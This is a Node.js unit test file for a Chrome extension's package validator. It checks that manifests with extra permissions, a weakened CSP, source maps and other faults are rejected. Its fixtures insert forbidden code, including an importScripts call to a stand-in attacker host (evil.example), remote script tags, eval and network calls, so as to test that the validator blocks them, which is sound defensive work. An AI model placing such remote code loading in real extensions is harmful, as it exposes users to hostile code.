// Unit tests for build/validate.mjs: a known-good package passes; each class of bad package fails.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, cpSync, writeFileSync, readFileSync, rmSync, existsSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { validateDist, readPngSize } from "../../build/validate.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..", "..");
const VERSION = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version;

// A valid package built from the real host sources, with placeholder (non-STUB) scripts.
function makeDist(mutate) {
  const dir = mkdtempSync(join(tmpdir(), "sfw-validate-"));
  cpSync(join(ROOT, "hosts", "chrome"), dir, { recursive: true });
  cpSync(join(ROOT, "vendor"), join(dir, "vendor"), { recursive: true }); // the OCR engine is part of every real package
  const manifest = JSON.parse(readFileSync(join(dir, "manifest.json"), "utf8"));
  manifest.version = VERSION;
  writeFileSync(join(dir, "manifest.json"), JSON.stringify(manifest, null, 2));
  writeFileSync(join(dir, "content.js"), "(function(){ 'use strict'; var shielded = 0; return shielded; })();\n".repeat(40));
  writeFileSync(join(dir, "content-main.js"), "(function(){ 'use strict'; })();\n");
  if (mutate) mutate(dir, manifest);
  return dir;
}
function withManifest(dir, change) {
  const m = JSON.parse(readFileSync(join(dir, "manifest.json"), "utf8"));
  change(m);
  writeFileSync(join(dir, "manifest.json"), JSON.stringify(m, null, 2));
}
function run(mutate) {
  const dir = makeDist(mutate);
  try { return validateDist(dir, { version: VERSION }); } finally { rmSync(dir, { recursive: true, force: true }); }
}
const failsWith = (result, re) => assert.ok(result.errors.some((e) => re.test(e)), `expected an error matching ${re}, got: ${JSON.stringify(result.errors)}`);

test("a good package passes with no errors", () => {
  const r = run();
  assert.deepEqual(r.errors, []);
});

test("rejects a non-MV3 manifest", () => failsWith(run((d) => withManifest(d, (m) => { m.manifest_version = 2; })), /manifest_version/));
test("rejects extra permissions", () => failsWith(run((d) => withManifest(d, (m) => { m.permissions = ["storage", "tabs"]; })), /permissions must be exactly/));
test("rejects missing storage permission", () => failsWith(run((d) => withManifest(d, (m) => { m.permissions = []; })), /permissions must be exactly/));
test("rejects host_permissions and optional permissions", () => {
  failsWith(run((d) => withManifest(d, (m) => { m.host_permissions = ["<all_urls>"]; })), /host_permissions/);
  failsWith(run((d) => withManifest(d, (m) => { m.optional_permissions = ["tabs"]; })), /optional_permissions/);
});
test("rejects a name that is too long or lacks the Unofficial marker", () => {
  failsWith(run((d) => withManifest(d, (m) => { m.name = "x".repeat(76); })), /max 75/);
  failsWith(run((d) => withManifest(d, (m) => { m.name = "Spoiler Firewall for GTA VI"; })), /Unofficial/);
  failsWith(run((d) => withManifest(d, (m) => { m.name = "Rockstar Spoiler Shield (Unofficial)"; })), /publisher/);
});
test("rejects an over-long description", () => failsWith(run((d) => withManifest(d, (m) => { m.description = "d".repeat(133); })), /max 132/));
test("rejects a version that does not match package.json", () => failsWith(run((d) => withManifest(d, (m) => { m.version = "9.9.9"; })), /does not match package.json/));
test("rejects a low minimum_chrome_version", () => failsWith(run((d) => withManifest(d, (m) => { m.minimum_chrome_version = "100"; })), /minimum_chrome_version/));
test("rejects a module service worker and a loosened CSP", () => {
  failsWith(run((d) => withManifest(d, (m) => { m.background.type = "module"; })), /classic/);
  failsWith(run((d) => withManifest(d, (m) => { m.content_security_policy = { extension_pages: "script-src 'self' 'unsafe-eval'" }; })), /content_security_policy/);
});
test("rejects content script flags that weaken coverage", () => {
  failsWith(run((d) => withManifest(d, (m) => { m.content_scripts[1].all_frames = false; })), /all_frames/);
  failsWith(run((d) => withManifest(d, (m) => { m.content_scripts[1].run_at = "document_idle"; })), /document_start/);
  failsWith(run((d) => withManifest(d, (m) => { m.content_scripts[1].matches = ["https://example.com/*"]; })), /<all_urls>/);
  failsWith(run((d) => withManifest(d, (m) => { delete m.content_scripts[0].world; })), /MAIN-world/);
});
test("rejects missing referenced files", () => {
  failsWith(run((d) => rmSync(join(d, "popup.html"))), /popup\.html/);
  failsWith(run((d) => rmSync(join(d, "service-worker.js"))), /service-worker\.js/);
});
test("rejects wrong icon sizes and non-PNG icons", () => {
  failsWith(run((d) => cpSync(join(d, "icons", "icon32.png"), join(d, "icons", "icon48.png"))), /expected 48x48/);
  failsWith(run((d) => writeFileSync(join(d, "icons", "icon16.png"), "not a png at all, just text padding")), /not a valid PNG/);
  failsWith(run((d) => withManifest(d, (m) => { delete m.icons["128"]; })), /icons\.128 missing/);
});
test("rejects eval, new Function, remote fetch and network APIs in shipped code", () => {
  failsWith(run((d) => writeFileSync(join(d, "content.js"), "eval('1+1');\n".repeat(300))), /eval/);
  failsWith(run((d) => writeFileSync(join(d, "content.js"), "var f = new Function('return 1');\n".repeat(100))), /new Function/);
  failsWith(run((d) => writeFileSync(join(d, "content.js"), "importScripts('https://evil.example/x.js');\n".repeat(100))), /remote/);
  failsWith(run((d) => writeFileSync(join(d, "service-worker.js"), "fetch('https://example.com/data');\n")), /fetch/);
  failsWith(run((d) => writeFileSync(join(d, "service-worker.js"), "navigator.sendBeacon('x');\n")), /sendBeacon/);
});
test("rejects unfinished STUB modules and source maps", () => {
  failsWith(run((d) => writeFileSync(join(d, "content.js"), "// STUB - replaced\n".repeat(200))), /STUB/);
  failsWith(run((d) => writeFileSync(join(d, "content.js"), "var a=1;\n//# sourceMappingURL=content.js.map\n".repeat(100))), /source map/);
  failsWith(run((d) => writeFileSync(join(d, "content.js.map"), "{}")), /forbidden file type/);
});
test("rejects test files, node_modules and dotfiles in the package", () => {
  failsWith(run((d) => { mkdirSync(join(d, "test")); writeFileSync(join(d, "test", "a.js"), "1"); }), /forbidden directory/);
  failsWith(run((d) => { mkdirSync(join(d, "node_modules")); writeFileSync(join(d, "node_modules", "a.js"), "1"); }), /forbidden directory/);
  failsWith(run((d) => writeFileSync(join(d, "popup.test.js"), "1")), /forbidden file name/);
  failsWith(run((d) => writeFileSync(join(d, ".env"), "1")), /forbidden file name/);
});
test("rejects remote scripts, inline scripts and inline handlers in pages", () => {
  const edit = (fn) => (d) => writeFileSync(join(d, "popup.html"), fn(readFileSync(join(d, "popup.html"), "utf8")));
  failsWith(run(edit((h) => h.replace("</body>", '<script src="https://cdn.example/x.js"></script></body>'))), /remote/);
  failsWith(run(edit((h) => h.replace("</body>", "<script>alert(1)</script></body>"))), /inline <script>/);
  failsWith(run(edit((h) => h.replace("<body", '<body onload="x()"'))), /inline event handler/);
  failsWith(run(edit((h) => h.replace("</head>", '<link rel="stylesheet" href="https://fonts.example/f.css"></head>'))), /remote/);
});
test("rejects spoiler-ish wording in UI strings", () => {
  failsWith(run((d) => withManifest(d, (m) => { m.description = "Hides the ending of the game."; })), /spoiler-ish/);
  failsWith(run((d) => writeFileSync(join(d, "options.html"), readFileSync(join(d, "options.html"), "utf8").replace("<main", "<main><p>Lucia dies</p><i"))), /spoiler-ish/);
});
test("a missing dist directory is an error, not a crash", () => {
  const r = validateDist(join(tmpdir(), "sfw-does-not-exist-" + Date.now()), { version: VERSION });
  assert.ok(r.errors.length > 0);
});

test("readPngSize parses real icon headers", () => {
  for (const size of [16, 32, 48, 128]) {
    const p = join(ROOT, "hosts", "chrome", "icons", `icon${size}.png`);
    assert.ok(existsSync(p), p);
    assert.deepEqual(readPngSize(readFileSync(p)), { width: size, height: size });
  }
  assert.equal(readPngSize(Buffer.from("nope")), null);
});

test("rejects Unicode noncharacters that make Chrome refuse to load a script", () => {
  failsWith(run((d) => writeFileSync(join(d, "content.js"), "var re = /[a-z\u0080-" + String.fromCharCode(0xffff) + "]/;\n".repeat(60))), /noncharacter/);
});
